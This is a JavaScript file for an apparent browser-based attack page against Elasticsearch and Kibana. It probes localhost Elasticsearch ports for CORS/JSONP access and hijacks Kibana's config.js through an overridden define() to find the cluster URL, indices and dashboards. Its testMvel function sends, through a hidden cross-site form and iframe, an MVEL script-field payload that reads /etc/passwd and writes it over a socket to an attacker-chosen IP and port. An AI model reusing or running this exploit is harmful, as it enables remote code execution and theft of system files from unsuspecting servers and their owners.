(function () {
	var printElasticsearchStats = function(data, div, reqType) {
		console.log($("table", div));
		console.log($("table", div).length);
		if($("table", div).length == 0) {
			var $table = $("<table/>");
			$table.append($("<tr/>").append($("<td/>").text("URL")).append($("<td/>").text("http://localhost:9200/")));
			$table.append($("<tr/>").append($("<td/>").text("Type")).append($("<td/>").text(reqType)));
			$table.append($("<tr/>").append($("<td/>").text("Status")).append($("<td/>").text(data.status)));
			$table.append($("<tr/>").append($("<td/>").text("Name")).append($("<td/>").text(data.name)));
			$table.append($("<tr/>").append($("<td/>").text("Version")).append($("<td/>").text(data.version.number)));
			$table.appendTo($(div));
		}
	};

	var loadElasticsearchStats = function () {
		var $resultDiv = $("div.esInfo > div").text("");
		var testPort = function (port) {
			var url = "http://localhost:" + port + "/";
			$("<div/>").append("Testing " + url).appendTo($resultDiv);
			var requestsFinished = {
				json: false,
				jsonp: false
			};
			var success = false;
			$.ajax({
				url: url,
				type: "GET",
				dataType: 'json',
				success: function (data) {
					$("<div/>")
						.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
						.append(" CORS is allowed - Node: " + data.name + " - Version: " + data.version.number)
						.appendTo($resultDiv);
					requestsFinished.json = true;
					success = true;
				},
				error: function () {
					$("<div/>")
						.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
						.append(" CORS is NOT allowed")
						.appendTo($resultDiv);
					requestsFinished.json = true;
				}
			});
			$.ajax({
				url: url,
				type: "GET",
				dataType: "jsonp",
				success: function (data) {
					$("<div/>")
						.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
						.append(" JSONP is allowed - Node: " + data.name + " - Version: " + data.version.number)
						.appendTo($resultDiv);
					requestsFinished.jsonp = true;
					success = true;
				},
				error: function () {
					$("<div/>")
						.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
						.append(" JSONP is NOT allowed")
						.appendTo($resultDiv);
					requestsFinished.jsonp = true;
				}
			});
			var checkExecutionFinished = function() {
				if(requestsFinished.json && requestsFinished.jsonp) {
					if(!success && port > 9200) {
						testPort(port - 1);
					}
				} else {
					setTimeout(checkExecutionFinished, 100);
				}
			}
			checkExecutionFinished();
		};
		testPort(9202); // starting at 9202 going downward to reach 9200
	};

	$("div.esInfo > button").click(loadElasticsearchStats);

    var extractHostFromURL = function (url) {
        var a = document.createElement('a');
        a.href = url;
        return a.hostname;
    };

	var testKibana = function () {
		var $resultDiv = $("div.kibanaTest > div.resultBox").html("");
		var kibanaUrl = $("div.kibanaTest > input").val().split("#")[0];
		if(kibanaUrl.endsWith("index.html")) {
			kibanaUrl = kibanaUrl.substring(0, kibanaUrl.length - 10);
		}
		var kibanaConfigUrl = kibanaUrl + "config.js";
        var kibanaHost = extractHostFromURL(kibanaUrl);
		var $div = $("<div/>")
			.append("Trying to read Kibana config from:<br/>")
			.append(kibanaConfigUrl)
			.appendTo($resultDiv);

//		Settings = function (settings) {
//			console.log("Settings constructor called!");
//			console.log(settings);
//		}

		var kibanaDefineCalled = false;
		define = function(a, b) {
			kibanaDefineCalled = true;
			b(function (settings) {
                var kibanaIndex = settings.kibana_index;
                var esUrl = settings.elasticsearch;
				var tmpLink = document.createElement('a');
				tmpLink.href = esUrl;
				console.log(tmpLink.hostname);
				console.log(window.location.hostname);
				if(tmpLink.hostname == window.location.hostname) {
					tmpLink.hostname = kibanaHost;
				}
				esUrl = tmpLink.href;
				if(!esUrl.endsWith("/")) {
					esUrl += "/";
				}
				$("input.esUrl").val(esUrl);
				$("span.esUrl").text(esUrl);
				var $div = $("<div/>").css("margin-top", "1em")
					.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
					.append(" Kibana config read!<br/>Elasticsearch URL: ")
					.append(esUrl)
					.appendTo($resultDiv);
				$.ajax({
					url: esUrl,
					type: "GET",
					dataType: "jsonp",
					success: function (data) {
						var $div = $("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
							.append(" JSONP / successful!<br/>Node info:")
							.appendTo($resultDiv);
						var $ul = $("<ul/>").appendTo($resultDiv);
						$ul.append($("<li/>").text("Name: " + data.name));
						$ul.append($("<li/>").text("Version: " + data.version.number));
					},
					error: function () {
						$("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
							.append(" JSONP / is NOT allowed")
							.appendTo($resultDiv);
					}
				});
				$.ajax({
					url: esUrl,
					type: "GET",
					dataType: "json",
					success: function (data) {
						var $div = $("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
							.append(" CORS / successful!<br/>Node info:")
							.appendTo($resultDiv);
						var $ul = $("<ul/>").appendTo($resultDiv);
						$ul.append($("<li/>").text("Name: " + data.name));
						$ul.append($("<li/>").text("Version: " + data.version.number));
					},
					error: function () {
						$("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
							.append(" CORS / is NOT allowed")
							.appendTo($resultDiv);
					}
				});
				var esListIndicesUrl = esUrl + "_aliases";
				$.ajax({
					url: esListIndicesUrl,
					type: "GET",
					dataType: "jsonp",
					success: function (data) {
						var $div = $("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
							.append(" JSONP _aliases successful!<br/>Available indices:")
							.appendTo($resultDiv);
						var $ul = $("<ul/>").appendTo($resultDiv);
						for (var key in data) {
							$ul.append($("<li/>").text(key));
						}
					},
					error: function () {
						$("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
							.append(" JSONP _aliases is NOT allowed")
							.appendTo($resultDiv);
					}
				});
				$.ajax({
					url: esListIndicesUrl,
					type: "GET",
					dataType: "json",
					success: function (data) {
						var $div = $("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
							.append(" CORS _aliases successful!<br/>Available indices:")
							.appendTo($resultDiv);
						var $ul = $("<ul/>").appendTo($resultDiv);
						for (var key in data) {
							$ul.append($("<li/>").text(key));
						}
					},
					error: function () {
						$("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
							.append(" CORS _aliases is NOT allowed")
							.appendTo($resultDiv);
					}
				});
				var kibanaDashboardsSearchUrl = esUrl + kibanaIndex + "/dashboard/_search";
				$.ajax({
					url: kibanaDashboardsSearchUrl,
					type: "GET",
					dataType: "jsonp",
					success: function (data) {
						var $div = $("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
							.append(" JSONP dashboard/_search successful!<br/>Kibana Dashboards:")
							.appendTo($resultDiv);
						var $ul = $("<ul/>").appendTo($resultDiv);
						$.each(data.hits.hits, function(index, hit) {
							$ul.append($("<li/>").text(hit._source.title));
						});

					},
					error: function () {
						$("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
							.append(" JSONP dashboard/_search is NOT allowed")
							.appendTo($resultDiv);
					}
				});
				$.ajax({
					url: kibanaDashboardsSearchUrl,
					type: "GET",
					dataType: "json",
					success: function (data) {
						var $div = $("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "green").addClass("icon-ok-2"))
							.append(" CORS dashboard/_search successful!<br/>Kibana Dashboards:")
							.appendTo($resultDiv);
						var $ul = $("<ul/>").appendTo($resultDiv);
						$.each(data.hits.hits, function(index, hit) {
							$ul.append($("<li/>").text(hit._source.title));
						});

					},
					error: function () {
						$("<div/>").css("margin-top", "1em")
							.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
							.append(" CORS dashboard/_search is NOT allowed")
							.appendTo($resultDiv);
					}
				});
            });
		};

		$("div.kibanaTest").append($("<script/>").attr("src", kibanaConfigUrl));
		setTimeout(function() {
			if(!kibanaDefineCalled) {
				var $div = $("<div/>").css("margin-top", "1em")
					.append($("<i/>").css("color", "red").addClass("icon-cancel-2"))
					.append(" Unable to read Kibana config from<br/>")
					.append(kibanaConfigUrl)
					.appendTo($resultDiv);
			}
		}, 1500);

	};

	$("div.kibanaTest > button").click(testKibana);

	$("#kibanaWriteOnlyTestDiv button").click(function() {
		var kibanaUrl = $("#kibanaWriteOnlyTestKibanaUrl").val().split("#")[0];
		if(kibanaUrl.endsWith("index.html")) {
			kibanaUrl = kibanaUrl.substring(0, kibanaUrl.length - 10);
		}
		var kibanaConfigUrl = kibanaUrl + "config.js";
		var kibanaHost = extractHostFromURL(kibanaUrl);
		var kibanaDefineCalled = false;
		define = function(a, b) {
			kibanaDefineCalled = true;
			b(function (settings) {
				var kibanaIndex = settings.kibana_index;
				var esUrl = settings.elasticsearch;
				var tmpLink = document.createElement('a');
				tmpLink.href = esUrl;
				if (tmpLink.hostname == window.location.hostname) {
					tmpLink.hostname = kibanaHost;
				}
				esUrl = tmpLink.href;
				$("#kibanaWriteOnlyTestEsUrl").val(esUrl);
				$("#kibanaWriteOnlyTestEsLookupResult").html("")
					.append($("<i/>").css("color", "green").addClass("icon-ok-2"));
				setTimeout(function() {
					$("#kibanaWriteOnlyTestEsLookupResult").html("");
				}, 3000);
			});
		}
		$("#kibanaWriteOnlyTestDiv").append($("<script/>").attr("src", kibanaConfigUrl));
		setTimeout(function() {
			if(!kibanaDefineCalled) {
				$("#kibanaWriteOnlyTestEsLookupResult").html("")
					.append($("<i/>").css("color", "red").addClass("icon-cancel-2"));
				setTimeout(function() {
					$("#kibanaWriteOnlyTestEsLookupResult").html("");
				}, 3000);
			}
		}, 1500);
	});

	$("#kibanaWriteOnlyTestDiv form").submit(function() {
		var esUrl = $("#kibanaWriteOnlyTestEsUrl").val();
		var action = $(this).attr("action");
		$(this).attr("action", action.replace("http://localhost:9200/", esUrl.endsWith("/") ? esUrl : esUrl + "/"));
	});

	var sendPostRequest = function(url, request) {
		var $body = $("body");
		var $form = $("<form/>").attr("action", url).attr("target", "hiddeniframe").attr("enctype", "text/plain").attr("method", "post").css("display", "none").appendTo($body);
		var equalPos = request.indexOf('=');
		if (equalPos > -1) {
			var key = request.substring(0, equalPos);
			var value = request.substring(equalPos + 1);
			$("<input/>").attr("type", "hidden").attr("name", key).attr("value", value).appendTo($form);
		}
		var $iframe = $("<iframe/>").attr("id", "hiddeniframe").attr("name", "hiddeniframe").css("display", "none").appendTo($body);
		$iframe.load(function () {
			$form.remove();
			$iframe.remove();
		});
		$form.submit();
	};

	var testMvel = function () {
		var esUrl = $("#mvelTestEsUrl").val();
		var targetIp = $("#mvelTestTargetIP").val();
		var targetPort = $("#mvelTestTargetPort").val();
		var requestUrl = esUrl.endsWith("/") ? esUrl + "_search" : esUrl + "/_search";
		var body = {
			fields: [],
			size: 1,
			script_fields: {
				hosts: {
					script: "import java.io.File; import java.util.Scanner; import java.net.Socket; import java.io.OutputStream; Socket s = new Socket(\""+targetIp+"\", "+targetPort+"); OutputStream o = s.getOutputStream(); o.write((new Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\Z\").next() + \"\\n\").getBytes(\"UTF-8\")); o.close(); s.close(); \"Yay\""
				}
			}
		};
		console.log(requestUrl);
		console.log(JSON.stringify(body));
		sendPostRequest(requestUrl, JSON.stringify(body));
	};

	$("div#mvelTestDiv > button").click(testMvel);

	$("#mvelTestEsUrl").change(function() {
		var esUrl = $("#mvelTestEsUrl").val();
		$("#mvelTestEsUrlCopy").text(esUrl.endsWith("/") ? esUrl : esUrl + "/");
	});

})();